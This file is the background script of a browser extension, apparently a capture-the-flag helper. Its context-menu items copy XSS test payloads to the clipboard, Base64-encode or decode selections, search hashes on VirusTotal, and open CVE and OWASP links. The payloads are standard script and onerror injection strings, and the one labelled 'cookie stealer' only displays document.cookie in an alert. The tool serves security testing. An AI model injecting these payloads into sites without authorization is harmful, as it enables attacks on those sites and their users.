const PARENT_ID = 'CTFHelper';
const XSSTEST_ID = 'XSSTestPayload';
const XSSCOOKIESTEALER_ID = 'XSSCookiestealer';
const ENCODE_DECODE = 'Encodeanddecode'
const USEFULLINK_ID = 'Usefullinks'
var payloadlist = [
    ///////XSS TESTING PAYLOAD//////
    {
        id: "XSSpayload1",
        parentId: XSSTEST_ID,
        title: "<script>alert(1)</script>",
        contexts: ["all"],
    },
    {
        id: "XSSpayload2",
        parentId: XSSTEST_ID,
        title: `<img src =q onerror=prompt(8)>`,
        contexts: ["all"],

    },
    {
        id: "XSSpayload3",
        parentId: XSSTEST_ID,
        title: `%253Cscript%253Ealert('XSS')%253C%252Fscript%253E`,
        contexts:["all"]
    },
    {
        id: "XSSpayload4",
        parentId: XSSTEST_ID,
        title: `'/><img src='' onerror=alert(1)>`,
        contexts:["all"]
    },
    ///////XSS COOKIE STEALER PAYLOAD//////
    {
        id: "XSScookiestealer1",
        parentId: XSSCOOKIESTEALER_ID,
        title: '<script>alert(document.cookie)</script>',
        contexts:["all"]

    },
    {
        id: "Base64encodeanddecode",
        parentId: ENCODE_DECODE,
        title: 'Base64 Encode | Decode',
        contexts: ["selection"]
    },
    {
        id: "Base64Encode",
        parentId: "Base64encodeanddecode",
        title: "Base 64 Encode",
        contexts:["selection"]
    },
    {
        id: "Base64Decode",
        parentId: "Base64encodeanddecode",
        title: "Base 64 Decode",
        contexts: ["selection"]
    },
    ///Hash Checker///
    {
        id: "virusTotal",
      
        title: 'Virus Total Hash Check',
        contexts:["selection"]
    },
    ///Useful Links///
    {
        id: "CVE",
        parentId: USEFULLINK_ID,
        title: 'CVE',
        contexts:["all"]
    },
    {
        id: "OWASP",
        parentId: USEFULLINK_ID,
        title: 'OWASP',
        contexts:["all"]
    }


]


createMenuItems()



browser.contextMenus.onClicked.addListener((info, tab) => {

    switch (info.menuItemId) {
        ///////XSS TESTING CODE//////
        case "XSSpayload1":
            console.log('XSS option 1 selected')
            copyStringToClipboard("<script>alert(1)</script>");
            break;
        case "XSSpayload2":
            console.log('XSS option 2 selected')
            copyStringToClipboard(`<img src =q onerror=alert(1)>`);
            break;
        case "XSSpayload3":
            console.log('XSS option 3 selected');
            copyStringToClipboard(`%253Cscript%253Ealert('XSS')%253C%252Fscript%253E`);
            break;
        case "XSSpayload4":
            console.log('XSS option 4 selected');
            copyStringToClipboard(`'/><img src='' onerror=alert(1)>`);
            break;
            ///////XSS COOKIE STEALER CODE//////
        case "XSScookiestealer1":
            console.log('XSS CookieStealer1 selected');
            copyStringToClipboard('<script>alert(document.cookie)</script>');
            break;
        case "Base64Encode":

            // Capture the selected text
            var selectedText = info.selectionText;

            // Check if text was selected
            if (selectedText) {
                console.log('Selected text:', selectedText.toString());
                // Convert selected text to Base64
                var convertedText = encodeString2base64(selectedText.toString());
                copyStringToClipboard(convertedText);
                console.log('Converted Base64:', convertedText);
            } else {
                console.log('No text selected');
            }
            break;
        case "Base64Decode":
            var selectedText = info.selectionText;

            // Check if text was selected
            if (selectedText) {
                console.log('Selected text:', selectedText.toString());
                // Convert selected text to Base64
                var convertedText = decodeString2base64(selectedText.toString());
                copyStringToClipboard(convertedText);
                console.log('Converted Base64:', convertedText);
            } else {
                console.log('No text selected');
            }
            break;

        ///////Virustotal /////
        case "virusTotal":
            var selectedText = info.selectionText;
            var searchString = 'https://www.virustotal.com/gui/search/' + encodeURIComponent(selectedText);
            console.log(selectedText)
            browser.windows.create({ url: searchString });
            break;
        ///////Useful Link section /////
        case 'CVE':
            var urlstring = 'https://www.cve.org/';
            browser.windows.create({ url: urlstring });
            break;
        case 'OWASP':
            var urlstring = 'https://owasp.org/'
            browser.windows.create({ url: urlstring });
            break;
        




    
           
    }


});
function createMenuItems() {

    browser.contextMenus.create(
        {
            id: ENCODE_DECODE,
            title: 'Encode|Decode',
            contexts: ["selection"]
        });
    browser.contextMenus.create(
        {
            id: "XSS",
            title: "XSS Payload"
        });
    browser.contextMenus.create(
        {
            id: XSSTEST_ID,
            parentId: "XSS",
            title: "XSS Testing Payload"
        });
    browser.contextMenus.create(
        {
            id: XSSCOOKIESTEALER_ID,
            parentId: "XSS",
            title: "XSS Cookie Stealer Payload"
        }
    );
    browser.contextMenus.create(
        {
            id: USEFULLINK_ID,
            title: "Useful Links"
        }
    )

    for (let i = 0; i < payloadlist.length; i++) {

        browser.contextMenus.create(
            {
                id: payloadlist[i].id,
                parentId: payloadlist[i].parentId,
                title: payloadlist[i].title,
                contexts: payloadlist[i].contexts
            }
        )

    }
    

        
    
    
}

function encodeString2base64(str) {
    return btoa(str);
}
function decodeString2base64(str) {
    return atob(str);
}

async function copyStringToClipboard(str) {
    try {
        // Use the Clipboard API to write text to the clipboard
        await navigator.clipboard.writeText(str);
        console.log("Text successfully copied to clipboard:", str);
    } catch (err) {
        console.error("Failed to copy text to clipboard:", err);
    }
}
